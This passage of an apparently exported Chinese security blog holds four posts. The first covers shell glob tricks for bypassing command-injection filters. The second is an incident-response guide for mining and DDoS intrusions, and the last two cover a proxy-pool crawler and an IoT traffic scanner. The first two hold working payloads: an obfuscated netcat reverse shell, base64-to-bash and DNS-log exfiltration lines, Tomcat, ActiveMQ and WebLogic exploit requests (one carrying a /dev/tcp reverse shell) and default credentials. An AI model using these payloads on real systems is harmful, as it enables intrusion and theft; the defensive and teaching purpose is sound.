    <content type="text"><![CDATA[前几天在微博和公众号上看到一些使用Linux通配符/glob模式来绕过命令执行的方式，感觉很不错，学习总结下。 首先先了解下什么是Linux shell 通配符/glob模式: 概念： glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的 /etc/glob （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将 glob 模式设为精简了的正则表达式，在最新的 CentOS 7 中已经删除了 glob 的相关描述文档，删除的原因由于 glob 已经整合到了 shell 之中，然后就有了 shell 通配符。shell 通配符 / glob 模式通常用来匹配目录以及文件，而不是文本！！！ 语法： 字符 解释 * 匹配任意长度任意字符 ? 匹配任意单个字符 [list] 匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合 [^list] 匹配指定范围外的任意单个字符或字符集合 [!list] 同[^list] {str1,str2,…} 匹配 srt1 或者 srt2 或者更多字符串，也可以是集合 专用字符集 字符 意义 [:alnum:] 任意数字或者字母 [:alpha:] 任意字母 [:space:] 空格 [:lower:] 小写字母 [:digit:] 任意数字 [:upper:] 任意大写字母 [:cntrl:] 控制符 [:graph:] 图形 [:print:] 可打印字符 [:punct:] 标点符号 [:xdigit:] 十六进制数 [:blank:] 空白字符（未验证） Linux shell 元字符，在使用通配符时如果没有进行转义可能就会被辨识为元字符 字符 作用 IFS 由 &lt; space &gt; 或 &lt; tab &gt;或 &lt; enter &gt; 三者之一组成 CR 由 &lt; enter &gt; 产生 = 设定变量 $ 作变量或运算替换 &gt; 重导向标准输出 &lt; 重导向标准输入 `\ ` 命令管线 &amp; 重导向文件描述符，或将命令静默执行 ( ) 将其内的命令置于 nested subshell 执行，或用于运算或命令替换 { } 将其内的命令置于 non-named function 中执行，或用在变量替换的界定范围 ; 在前一个命令结束时，而忽略其返回值，继续执行下一个命令 &amp;&amp; 在前一个命令结束时，若返回值为 true，继续执行下一个命令 `\ \ ` 在前一个命令结束时，若返回值为 false，继续执行下一个命令 ! 执行 history 中的命令 示例： 举几个简单的例子，举一反三，同理，各种混合结合效果更佳！ 123456789 w2n1ck@w2n1ck ~/Desktop/shell  ls a*?abc.txt w2n1ck@w2n1ck ~/Desktop/shell  /???/[l]s12.txt abc.txt w2n1ck@w2n1ck ~/Desktop/shell  /???/[:lower:]s12.txt abc.txt再比如：/?s?/???/[n]c 2130706433 8888 -e /???/b??h... 其他绕过方式 12345678910111213141516171819202122ls | idls ; id 在shell中，担任"连续指令"功能的符号就是"分号"ls &amp; idls 回车 idls `id` ls ` id` 前面加了一个空格ls `\id` 反斜杠 i\d等价于idls $(id)ls | a=i;b=d;$a$b 拼接ls | echo aWQ=| base64 -d | bash 利用base64`echo "aWQ="|base64 -d`ls | curl xxx.ceye.io/`whoami` 利用dnslog或者http web logcat&lt;1.txtcat$IFS$91.txtcat$&#123;IFS&#125;1.txtcat$IFS1.txt%0acat%091.txtw'h'o'am'iw"h"o"am"iwho$@amiecho i$@d|$0w$@h$@o$@a$@m$@i 注意事项 在使用专属字符集的时候，字符集之外还需要用 [ ] 来包含住，否则专用字符集不会生效，例如 [[:space:]] 想要转义的时候，单引号与双引号使用方法是不同的，单引号会转义所有字符，而且单引号中间不允许再出现单引号，双引号允许出现特定的 shell 元字符，具体字符可以自行查询 在使用花括号 {} 的时候，里面的单个字符串需要使用单引号或者双引号括住，否则就会视为多个的单个字符 Referer： https://www.cnblogs.com/divent/archive/2016/08/11/5762154.html https://medium.com/secjuice/waf-evasion-techniques-718026d693d8]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WAF绕过</tag>
        <tag>linux</tag>
        <tag>命令执行</tag>
        <tag>通配符</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Linux挖矿、DDOS等应急事件处置方法]]></title>
    <url>%2F2018%2F05%2F08%2F%E5%85%B3%E4%BA%8ELinux%E6%8C%96%E7%9F%BF%E3%80%81DDOS%E7%AD%89%E5%BA%94%E6%80%A5%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%BD%AE%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[前言从去年六月份到现在做的应急响应、事件分析大大小小的做了23十个，主要遇到的有挖矿、DDoS、短信接口盗刷、用户接口泄漏、越权信息获取、挂黑页、删数据等。本文只针对自己做的应急响应中的挖矿和DDoS两类做一下总结及自己的处置方法，帮助运维等相关人员在遇到之后能够快速响应、处置。文章有不足之处欢迎大家指出、补充。 0x01 应急事件处理流程是什么？服务器安全排查 webshell 查找 木马病毒查找和清理 恶意进程、网络连接和自启任务等清理 问题事件分析 溯源事件缘由、黑客攻击途径 应用系统安全漏洞排查 应用安全漏洞排查 0x02 攻击者进行挖矿、DDoS利用的漏洞有哪些？1、未授权访问未授权访问在我所处置的应急响应事件中所占的比重最大，主要分为以下几种： redis未授权访问 redis未授权访问主要被用来进行挖矿，一般手段是通过redis写入计划任务，基本上都是形如：/bin/sh -c /usr/bin/curl -sL https://lnk0.com/VhscA1|sh，直接进行挖矿、ddos等。 排查方法： 1redis-cli -h host -p port 修复方法： 绑定本地访问：bind 127.0.0.1 添加认证：requirepass www.secpulse.com memcache未授权访问 memcache未授权访问主要被用来进行DDoS，在今年三月份爆发，攻击者利用memcached协议，发送大量带有被害者IP地址的UDP数据包给放大器主机，然后放大器主机对伪造的IP地址源做出大量回应，形成分布式拒绝服务攻击，从而形成DRDoS反射。 排查方法： 1nc host port 修复方法： 设置memchached只允许本地访问 禁止外网访问Memcached 11211端口 编译时加上–enable-sasl，启用SASL认证 docker未授权访问 docker未授权访问主要被用来进行挖矿，通过挂载宿主机的/etc/、/var/spool/cron/等目录，之后将相关挖矿的脚本、命令等写入到/etc/crontab，/var/spool/cron/crontabs/root中。 排查方法： 1curl http://IP:2375/containers/json 修复方法： 在不必需的情况下，不要启用docker的remote api服务 在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证 k8s未授权访问 k8s未授权访问主要被用来挖矿，API Server 默认会开启两个端口：8080和 6443。其中 8080 端口无需认证，6443 端口需要认证，且有 TLS 保护，直接访问8080端口会返回可用的API列表。访问dashboard 页面，可以创建、修改、删除容器，查看日志等。攻击者利用的流程大体为：创建新的容器 -&gt; 挂载宿主机目录 -&gt; 写 /etc/crontab定时任务进行挖矿。 排查方法： 1curl http://IP:8080/ 修复方法： 配置安全组、防火墙等，禁止敏感端口对外开放 为管理端添加认证2、Tomcat Tomcat目前常被利用的有： Tomcat PUT任意文件写入漏洞（CVE-2017-12615） 排查方法： 直接发送以下数据包即可在Web根目录写入shell 12345678910PUT /test.jsp/ HTTP/1.1Host: ip:portAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 4test Tomcat弱口令部署war包getshell 排查方法： 查看tomcat管理控制台是否存在如下弱口令： | 用户名 | 密码 || :—-: | :——–: || tomcat | tomcat || admin | j5Brn9 || admin | admin || admin | tomcat || role | changethis || role1 | role1 || root | root || root | changethis || role1 | tomcat || both | tomcat || tomcat | changethis | 修复方法： 严禁弱口令，使用数字+字母+特殊字符的十位以上强密码 及时升级Tomcat补丁 安全组、防火墙等设置访问白名单 3、ActiveMQActiveMQ目前常被利用的有： ActiveMQ反序列化命令执行（CVE-2015-5254） 默认开启61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。攻击者利用的流程为：构造可执行命令的序列化对象 -&gt; 作为一个消息，发送给目标61616端口 -&gt;访问web管理页面，读取消息，触发漏洞 排查方法： 下载jmet的jar文件 1java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/activemq" -Yp ROME IP 61616 访问：http://ip:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息 点击查看这条消息即可触发命令执行 ActiveMQ fileserver任意文件写入漏洞（CVE-2016-3088） ActiveMQ的web控制台8161端口分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api需要登录后才能使用，fileserver无需登录。目前见到的是直接写入cron挖矿，简单粗暴！ 排查方法： 123456789PUT /fileserver/test.txt HTTP/1.1Host: ip:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 4test 写入到计划任务 12345678MOVE /fileserver/text.txt HTTP/1.1Destination: file:///etc/cron.d/rootHost: ip:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 0 修复方法： 严禁弱口令，使用数字+字母+特殊字符的十位以上强密码 及时升级ActiveMQ补丁 安全组、防火墙等设置访问白名单 4、爆破主要是Windows3389、Linux ssh爆破，爆破成功之后直接执行命令进行挖矿、DDoS。 排查方法： 网上搜索自己的密码是否被公开活在黑客字典中 修复方法： 严禁弱口令，使用数字+字母+特殊字符的十位以上强密码 安全组、防火墙等设置白名单访问 5、Struts2利用Struts2反序列化命令执行，直接执行相关命令。 排查方法： 搜索网上一键扫描struts2漏洞的工具进行检测 修复方法： 及时升级Struts2相关补丁6、Java RMI命令执行 RMI服务的默认开放1099端口，且暴露在公网中，并且恰好使用了Apache Commons Collections的缺陷版本，可被直接利用来进行任意命令执行。 排查方法： 使用nmap进行端口扫描 修复方法： 升级相应缺陷版本 安全组、防火墙等设置拒绝RMI端口访问 7、Weblogic目前见到的主要被利用的是Weblogic wls-wsat XMLDecoder反序列化漏洞（CVE-2017-10271）。 Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 排查方法： 发送如下数据包，注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误： 12345678910111213141516171819202122232425262728293031POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: IP:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;&lt;void class="java.lang.ProcessBuilder"&gt;&lt;array class="java.lang.String" length="3"&gt;&lt;void index="0"&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index="1"&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index="2"&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.2.11/8080 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method="start"/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 修复方法： 升级weblogic相关补丁到最新版本 安全组、防火墙等设置相关敏感端口白名单访问 0x03 应急响应快速排查步骤以Linux为例，以下相关步骤只针对挖矿、DDoS相关安全事件的排查，以便快速、高效解决问题。其他安全事件按照通用事件排查步骤即可。 检查进程及文件top -c ： 快速查看进程信息，并获取进程文件位置 kill -9 PID ： 杀死进程 根据恶意进程、文件特征如：文件名、文件大小、文件创建时间进行全盘搜索 grep -rni &quot;shell.name&quot; * ： 根据文件名特征查找 find / -size 1223123c ： 根据文件大小特征查找 find / -mtime 1 -name * ： 根据文件创建时间查找 lsof -p PID：查看进程占用信息 cd /proc/PID ： 进入到进程中 cat * |strings -n 5 |more ： 读取该进程内存中的信息 检测网络lsof -i:5000 ： 查看5000端口的占用情况 netstat -nap ： 查看不正常端口 netstat -an | grep tcp | awk &#39;{print $5}&#39; ： 查看TCP连接 netstat -an | grep SYN | awk &#39;{print $5}&#39; | awk -F: &#39;{print $1}&#39; | sort | uniq -c | sort -nr | more ： 查看SYN连接 检查计划任务crontab -u root -l ： 查看root用户的计划任务 cat /etc/crontab ： 查看/etc/crontab ls -al /etc/cron.* ： 查看cron文件是否变化的详细信息 ll /var/spool/cron/ ： 查看/var/spool/cron/ 检查系统命令123ls -alt /bin/ | head -n 10ls -alt /usr/sbin/ | head -n 10ls -alt /usr/bin/ | head -n 10 Webshell1、河马 2、自写脚本（推荐，因为可根据情况，自己加特征等） 使用杀毒软件ClamAV 123扫描：clamscan -r /usr —max-dir-recursion=5 -l /tmp/clamav.log移除：clamscan -r —remove /usr/bin/ rkhunter 123rkhunter --propupdrkhunter --check 注意事项1、一定要查看系统命令是否被替换，否则所做的都是一切徒劳。。。 2、若系统替换可用其他代替，如：ps使用top，netstat使用ss等 3、lsof -n |grep delete 查找已经删除但是还在使用的文件 4、留意下是否有SSH后门 5、注意是否存在隐藏进程 6、实在无法删除可使用chattr +i锁定相应计划任务文件 7、实在不行修改把curl ，wget ,lynx 文件全局重命名 附：记一次事件分析详细排查步骤1、事件缘由客户反馈服务器D盘里面的文件被删除了，要求排查什么原因导致的，什么漏洞引发的。 2、事件分析前期准备工作：端口扫描、黑盒漏扫、弱口令、是否存在命令执行相关漏洞等，未果，进入服务器排查。 D盾全盘webshell查杀发现恶意文件（中间的一些用户，组，进程，日志排查步骤等我就不说了） webshell名为enshell.aspx 根据该webshell文件名查找日志 定位记录该恶意文件的日志信息，找到攻击者IP 攻击者IP：110.87.13.61 威胁情报来一波 根据IP定位黑客攻击点 定位记录详情 定位漏洞源头 至此，事件分析结束。 3、事件结论由此可知：黑客先利用/xxx/upload2Server/接口上传了恶意文件，再利用/xxx/checkfileexists/判断文件是否上传成功，最后利用，/xxx/executecmd/执行了该恶意文件。]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>linux</tag>
        <tag>应急响应</tag>
        <tag>命令执行</tag>
        <tag>反序列化</tag>
        <tag>Redis</tag>
        <tag>Memcache</tag>
        <tag>Weblogic</tag>
        <tag>ActiveMQ</tag>
        <tag>Tomcat</tag>
        <tag>Kubernetes</tag>
        <tag>RMI</tag>
        <tag>Docker</tag>
        <tag>Struts2</tag>
        <tag>未授权访问</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PrxoyPool-免费代理池的设计与实现]]></title>
    <url>%2F2018%2F04%2F27%2FPrxoyPool-%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言在进行渗透测试、漏洞挖掘的时候，使用自动化工具是必须的一步，但是令人😠的是，经常由于扫描等原因导致IP被ban，这是我们最不想看到的。所以本着学习编程的目的，根据网上搜索的资料，东拼西凑的开发了这个系统。 0x01 涉及技术 Python3 使用Python3的原因是由于异步IO使用的是asyncio和aiohttp，所以就学习尝试了下Python3，其实没多大区别感觉。（刚开始学编程，原谅我啥都不知道😜） Flask 使用Flask作为Web开发微框架，交与其他Python框架，具有简便、易扩展等优点。具体可看：Flask中文文档 Redis Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。 五种类型数据类型为：字符串、列表、集合、有序集合、散列表。本次数据存储方面就利用的redis的有序集合。 爬虫 爬虫部分是从11个免费代理网站上抓取免费、高可用性的代理IP，并进行数据处理获取统一格式。同时本着学习的理念使用了：lxml，pyquery，正则，json等不同的技术来实现。 异步IO 默认给代理池设置的阈值为50000，由于数量比较大，为了提高代理高可用性的检测效率，我们在这里使用异步请求库aiohttp来进行检测。具体参考：廖雪峰的官方网站-异步IO 前端 web前端部分我是真不懂（但是我会抄啊😝），直接wget的一个自己觉得比较简洁的网站的前端，哈哈😄～ 0x02 架构部分 主要分为如下几个模块： 爬虫模块： 主要从11个免费代理网站上抓取免费的代理IP，并进行格式统一处理。同时为了保证代理池的枯竭，采用周期性抓取。 1234567891011www.66ip.cnwww.xdaili.cnwww.kuaidailiwww.ip3366.netwww.89ip.cnwww.xicidaili.comwww.iphai.compremproxy.comwww.xroxy.comwww.data5u.comwww.kxdaili.com 存储模块 主要学习了GitHub上一个采用的redis的有序集合来进行的，一是保证代理数据的不重复，二是使用zscore来标记代理的可用性。 检测模块 定时检测数据库中的代理的可用性情况，并采用打分机制，初始化一个分值，若可用则标记为最高，不可用则在初始化分值基础上减1，直到为0，则从redis中删除。后续random获取的时候采用分值最高的优先展示的从高到低模式。同时保证代理的实时可用性，设置定时检测。 API模块 采用Flask作为web服务器，前端copy的别人的改的。从redis数据库中优先选择出分数最高的，若同时存在多个，则随机选择一个。 ​ 0x03 具体实现爬虫模块1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071def crawl_daili66(self, page_count=4): """ 获取代理:www.66ip.cn 方法:pyquery """ start_url = 'http://www.66ip.cn/&#123;&#125;.html' urls = [start_url.format(page) for page in range(1, page_count + 1)] for url in urls: html = get_page(url) if html: doc = pq(html) trs = doc('.containerbox table tr:gt(0)').items() for tr in trs: ip = tr.find('td:nth-child(1)').text() port = tr.find('td:nth-child(2)').text() yield ':'.join([ip, port])def crawl_ip181(self, page_count=2): """ 获取代理:www.xdaili.cn 方法:json """ start_url = 'http://www.xdaili.cn/ipagent//freeip/getFreeIps?page=&#123;&#125;' urls = [start_url.format(page) for page in range(1, page_count + 1)] for url in urls: try: response = requests.get(url) print('抓取成功 &gt;&gt;&gt; ', url, response.status_code) if response.status_code == 200: html = response.json() except ConnectionError: print('抓取失败 &gt;&gt;&gt; ', url) pass if html: # ip_address = re.compile(r'"ip":"(.*?)","port":"(.*?)"') # ip_address = ip_address.findall(html) for key in html['RESULT']['rows']: yield ':'.join([key['ip'], key['port']])def crawl_kuaidaili(self): """ 获取代理:www.kuaidaili 方法:xpath """ for i in range(1, 4): start_url = 'http://www.kuaidaili.com/free/inha/&#123;&#125;/'.format(i) html = get_page(start_url) if html: html = etree.HTML(html, parser=etree.HTMLParser(encoding='utf-8')) _ip_xpath = '//*[@id="list"]/table/tbody/tr[&#123;&#125;]/td[1]/text()' _port_xpath = '//*[@id="list"]/table/tbody/tr[&#123;&#125;]/td[2]/text()' for i in range(1, 16): ip_xpath = _ip_xpath.format(i) port_xpath = _port_xpath.format(i) ip = html.xpath(ip_xpath)[0] port = html.xpath(port_xpath)[0] yield ":".join([ip, port])def crawl_ip3366(self): """ 获取代理:www.ip3366.net 方法:正则 """ for page in range(1, 4): start_url = 'http://www.ip3366.net/free/?stype=1&amp;page=&#123;&#125;'.format(page) html = get_page(start_url) ip_address = re.compile('&lt;tr&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;') re_ip_address = ip_address.findall(html) for address, port in re_ip_address: result = address + ':' + port yield result.replace(' ', '') 本着学习的目的，同时采用了pyquery，正则，json，xpath等不同的获取方法，使用yield来将这些方法定义成生成器，这样我们每次请求就会通过yield来返回一个代理IP。 同时使用crawl_开头的函数命名方法，来达到动态添加代理网站地址接口的目的（这部分借鉴的大神的），具体参考：python元类解析 12345678910111213141516171819class ProxyMetaclass(type): def __new__(cls, name, bases, attrs): count = 0 attrs['__CrawlFunc__'] = [] for k, v in attrs.items(): if 'crawl_' in k: attrs['__CrawlFunc__'].append(k) count += 1 attrs['__CrawlFuncCount__'] = count return type.__new__(cls, name, bases, attrs)class Crawler(object, metaclass=ProxyMetaclass): def get_proxies(self, callback): proxies = [] for proxy in eval("self.&#123;&#125;()".format(callback)): print(u'成功获取到代理 &gt;&gt;&gt; ', proxy) proxies.append(proxy) return proxies 定义类ProxyMetaclass并声明一个__new__方法，同时Crawler类将它声明为元类，这个方法有固定的几个参数cls, name, bases, attrs，第四个参数attrs中包含了类的一些属性。我们可以遍历attrs这个参数即可获取类的所有方法信息，就像遍历字典一样，键名对应方法的名称。然后判断方法的开头是否crawl_，如果是，则将其加入到__CrawlFunc__属性中。这样我们就成功将所有以crawl_开头的方法定义成了一个属性，动态获取到所有以crawl_开头的方法列表。 然后定义了一个get_proxies()方法，将所有以crawl_开头的方法调用一遍，获取每个方法返回的代理并组合成列表形式返回。 存储模块采用redis的有序集合，集合的特点是集合的每一个元素都是不重复的，这样就保证了代理的不重复。有序集合，顾名思义，这里存储的数据是有序的，我们就可以利用这点对代理IP进行打分、排序，实现权重的效果。具体可参考：Redis 有序集合(sorted set) 连接redis 1db = redis.StrictRedis(host=host, port=port, password=password, decode_responses=True) 添加数据，添加代理，设置分数为最高 123456def add(self, proxy, score=INITIAL_SCORE): if not re.match('\d+\.\d+\.\d+\.\d+\:\d+', proxy): print('代理不符合规范', proxy, u'丢弃') return if not self.db.zscore(REDIS_KEY, proxy): return self.db.zadd(REDIS_KEY, score, proxy) 获取代理IP，随机获取有效代理，首先尝试获取最高分数代理，如果不存在，按照排名获取，否则异常 1234567891011def random(self): result = self.db.zrangebyscore(REDIS_KEY, MAX_SCORE, MAX_SCORE) if len(result): return choice(result) else: result = self.db.zrevrange(REDIS_KEY, 0, 100) if len(result): return choice(result) else: raise PoolEmptyError 删除代理IP，代理值减一分，小于最小值则删除 123456789def decrease(self, proxy): score = self.db.zscore(REDIS_KEY, proxy) if score and score &gt; MIN_SCORE: print('代理', proxy, u'当前分数', score, u'减1') return self.db.zincrby(REDIS_KEY, proxy, -1) else: print('代理', proxy, u'当前分数', score, '移除') return self.db.zrem(REDIS_KEY, proxy) 检测模块代理检测第一次可用，则分数设置为100，代理不可用，分数减1，这样就可以实时改变每个代理的可用情况。API接口返回的时候只需要获取分数高的代理即可。使用的python3的异步IO库aiohttp，参考的大神的表演，学习了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Tester(object): def __init__(self): self.redis = RedisClient() async def test_single_proxy(self, proxy): """ 异步测试单个代理IP并写入redis """ conn = aiohttp.TCPConnector(verify_ssl=False) async with aiohttp.ClientSession(connector=conn) as session: try: if isinstance(proxy, bytes): proxy = proxy.decode('utf-8') real_proxy = 'http://' + proxy print('正在测试 &gt;&gt;&gt;', proxy) async with session.get(TEST_URL, proxy=real_proxy, timeout=15, allow_redirects=False) as response: if response.status in VALID_STATUS_CODES: self.redis.max(proxy) print('代理可用 &gt;&gt;&gt; ', proxy) else: self.redis.decrease(proxy) print('请求响应码不合法 &gt;&gt;&gt;', response.status, 'IP', proxy) except Exception as e: self.redis.decrease(proxy) print('代理请求失败 &gt;&gt;&gt; ', proxy) def run(self): """ 测试主函数 """ print('*** 测试器开始运行 ***') try: count = self.redis.count() print('当前剩余：', count, u'个代理') for i in range(0, count, BATCH_TEST_SIZE): start = i stop = min(i + BATCH_TEST_SIZE, count) print('正在测试第', start + 1, '-', stop, u'个代理') test_proxies = self.redis.batch(start, stop) loop = asyncio.get_event_loop() tasks = [self.test_single_proxy(proxy) for proxy in test_proxies] loop.run_until_complete(asyncio.wait(tasks)) sys.stdout.flush() time.sleep(5) except Exception as e: print('测试器发生错误', e.args) 定义了一个类Tester，接下来定义了一个test_single_proxy()方法，并在前面加了async关键词，这代表这个方法是异步的。方法内部首先创建了aiohttp的ClientSession对象，此对象类似于requests的Session对象，可以直接调用该对象的get()方法来访问页面。在这里，代理的设置是通过proxy参数传递给get()方法，程序在获取Response后需要判断响应的状态，如果状态码在VALID_STATUS_CODES列表里，则代表代理可用，可以调用RedisClient的max()方法将代理分数设为100，否则调用decrease()方法将代理分数减1，如果出现异常也同样将代理分数减1。 0x04 接口模块使用Flask实现接口模块，前端wget的VulApps的前端模版。 1234567891011121314151617181920212223242526272829303132333435__all__ = ['app']app = Flask(__name__)def get_conn(): if not hasattr(g, 'redis'): g.redis = RedisClient() return g.redis@app.route('/')def index(): render = render_template('index.html') return make_response(render)@app.route('/random')def get_proxy(): """ 获取proxyAPI :return: 随机代理 """ conn = get_conn() return conn.random()@app.route('/count')def get_counts(): """ Get the count of proxies :return: 代理池总量 """ conn = get_conn() return str(conn.count())if __name__ == '__main__': app.run() 前端模版index.html 项目地址：http://proxy.w2n1ck.com:9090/ API接口：http://proxy.w2n1ck.com:9090/random 0x05 使用测试结果如下： 获取代理IP： 123456789import requestsPROXY_POOL_URL = 'http://proxy.w2n1ck.com:9090/random'def get_proxy(): try: response = requests.get(PROXY_POOL_URL) if response.status_code == 200: return response.text except ConnectionError: return None 使用代理IP： 1234567891011import requestsproxy = get_proxy()proxies = &#123; 'http': 'http://' + proxy, 'https': 'https://' + proxy,&#125;try: response = requests.get('http://ip.cn/', proxies=proxies) print(response.text)except: pass]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>爬虫</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>Redis</tag>
        <tag>代理</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[伏特漏洞扫描-IoT设备安全解决方案]]></title>
    <url>%2F2018%2F04%2F23%2F%E4%BC%8F%E7%89%B9%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-IoT%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[# 前言随着智能硬件的兴起，大量智能家居和可穿戴设备进入了人们的生活，根据Gartner 报告预测，2020年全球IOT物联网设备数量将高达260亿个。但是由于安全标准滞后，以及智能设备制造商缺乏安全意识和投入，物联网已经埋下极大隐患，是个人隐私、企业信息安全甚至国家关键基础设施的头号安全威胁。试想一下，无论家用或企业级的互连设备，如接入互联网的交通指示灯，恒温器，或医用监控设备遭到攻击，后果都将非常可怕。 # 0x01 物联网安全需求物联网根据业务形态主要分为工业控制物联网、车载物联网、智能家居物联网。不同的业务形态对安全的需求不尽相同。 工业控制物联网：涉及到国家安全、再加上目前工业控制网络基本是明文协议很容易遭受攻击。目前安全公司有威努特、匡恩网络等且在市场中已经有很好成效。主要产品形态：工控防火墙、工控漏洞挖掘、主机白名单产品。安全需求基本是传统安全的思路。 车载物联网：涉及财产安全及驾车人生命安全。国外相关安全厂商产品形态大致是OBD防火墙、云端大数据分析异常监控等。安全需求集中在车载核心物联网硬件安全及嵌入式设备安全上。 智能家居物联网：涉及到个人及家庭的隐私和数据安全。同时，由于近期各种DDOS、僵尸网络等安全事件的爆发，所以智能家具设备安全问题迫在眉睫。本解决方案主要面向与智能家居物联网方向。 # 0x02 IOT设备通用漏洞按风险技术类型分布2017年CNVD收录IOT设备漏洞类型分别为权限绕过、拒绝服务、信息泄露、跨站、命令执行、缓冲区溢出、SQL注入、弱口令、设计缺陷等漏洞。其中，权限绕过、拒绝服务、信息泄露漏洞数量位列前三，分别占收录漏洞总数的23%，19%，13%。而对于弱口令（或内置默认口令）漏洞，虽然在统计比例中漏洞条数占比不大（2%），但实际影响却十分广泛，成为恶意代码攻击利用的重要风险点。 # 0x03 目前IoT设备安全测试的难点 物联网设备数量和数据流量大，测试点不完全 没有统一相关漏洞管理等平台，不方便漏洞跟踪 测试任务量与人员数量不匹配 目前市面暂时无法找到针对IoT设备的自动化安全测试工具 # 0x04 以机顶盒为例的IoT设备解决方案结合目前IoT设备安全测试的难点及伏特漏洞扫描云平台本身的产品优势，目前提出了一个关于以机顶盒为例的IoT设备解决方案。 伏特漏洞扫描产品的一大技术创新是被动扫描，该功能主要优势有： 无人员干预，全局持续化监控业务线, 弥补基于爬虫的主动扫描短板, 使监控范围更加完整。 全流量监控，解决了代理流量身份鉴别、权限划分、目标域限制等问题导致的相关功能无法测试难点 测试点更加全面，支持OWASP TOP 10、系统服务漏洞、框架漏洞、常见服务弱密码检测、通用CSM漏洞插件等 根据机顶盒相关网络架构，及伏特漏洞扫描器本身技术特点，采用如下接入方式： 具体步骤如下： 测试人员按照正常功能测试，操作机顶盒 机顶盒连接端口镜像交换机，流量走正常业务流程的同时被镜像到监控平台 流量监控平台监听所有进入的流量，并存储到redis扫描任务队列 redis扫描任务队列分发到后端伏特分布式扫描平台 后端进行全流量漏洞扫描 0x04 技术实现部分代码Redis客户端： 123456789101112131415161718class redis(): def __init__(self,host, port, password=None, count=1): ... def rpush(self, key, value, expire=None): self.r.rpush(key, value) if isinstance(expire, int): self.r.expire(key,expire) def rpop(self, key): n = 0 KV = &#123;&#125; list = [] result = self.r.rpop(key) if result == None: return None else: return result 流量监控平台使用python的libpcap模块 1234// 设置监听的流量规则pc = pcap.pcap()pc.setfilter("tcp")tracker=&#123;&#125; 捕捉流量包（包括接受和发送的所有流量） 1234567891011121314for ts, pkt in pc: ... ltuple=(src,tcp.sport,dst,tcp.dport) rtuple=(dst,tcp.dport,src,tcp.sport) try: tracker[ltuple] try: tracker[ltuple]['out']+=data except KeyError: tracker[ltuple]['out']=data tracker[ltuple]['lastseen']=time.time() except KeyError: ... tracker[rtuple]['lastseen']=time.time() 对捕捉的流量进行处理、提取 1234567891011121314151617181920for connection in tracker.keys(): # print tracker[connection] if time.time()-tracker[connection]['lastseen']&gt;600: del tracker[connection] continue ... try: if tracker[connection]['in'] and tracker[connection]['out']: data=tracker[connection]['in'] data+=tracker[connection]['out'] uri=re.search("(GET|POST) ([^\r\n]*)( HTTP/)",data,re.IGNORECASE) postreg = re.compile("\r\n\r\n(.*?)HTTP/1",re.S) postdata = re.findall(postreg,data) webserver = re.search("server: ([^\r\n]*)",data,re.IGNORECASE) ... if uri: for i in uri.string.split('\r\n'): if i.startswith('Cookie:'): cookie = i]]></content>
      <tags>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>Redis</tag>
        <tag>扫描器</tag>
      </tags>
  </entry>
  <entry>
